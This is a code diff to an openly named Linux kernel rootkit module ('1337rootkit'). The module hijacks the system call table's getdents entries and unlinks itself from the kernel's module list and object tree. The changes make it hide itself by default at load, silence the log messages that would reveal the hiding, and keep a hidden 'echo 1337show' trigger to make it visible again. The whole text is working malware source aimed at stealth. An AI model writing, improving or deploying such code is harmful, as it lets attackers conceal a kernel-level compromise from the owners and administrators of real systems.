@@ -99,10 +99,10 @@ void hijack_sys_call_table(void){
 /*
 Remove our rootkit from list of modules and kernel objects.
 */
-static void rootkit_hide(void) {
+void rootkit_hide(void) {
 
 	if (rootkit_hidden) return;
-	printk(KERN_INFO "hiding 1337rootkit\n");
+	//printk(KERN_INFO "hiding 1337rootkit\n");
 
 	/*store the previous module of the list
 	  then hide the rootkit module*/
@@ -115,13 +115,12 @@ static void rootkit_hide(void) {
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry); 
 
-
-	printk(KERN_INFO "1337rootkit hidden\n");
+	//printk(KERN_INFO "1337rootkit hidden\n");
 	rootkit_hidden = 1;
 	
 }
 
-static void rootkit_show(void) {
+void rootkit_show(void) {
 
 	if (!rootkit_hidden) return;
 	rootkit_hidden = 0;
@@ -143,20 +142,18 @@ int init_module(void){
 	sys_call_table = (unsigned long*)0xc1688140;
 	
 	//sys_call_table = (unsigned long*)0xc15c3060;
-	hijack_sys_call_table();
-	//rootkit_hide();	
 	
-
+	hijack_sys_call_table();
+	//hide our rootkit by default
+	//use 'echo 1337show' to make visible again or else unable to remove mod
+	rootkit_hide();	
 
 	printk(KERN_INFO "Rootkit added.\n\n");
-
-
 	return 0;
 }
 
 void cleanup_module(void){
 
-	//rootkit_show();
     make_rw((unsigned long)sys_call_table);
 	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
 	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents64;
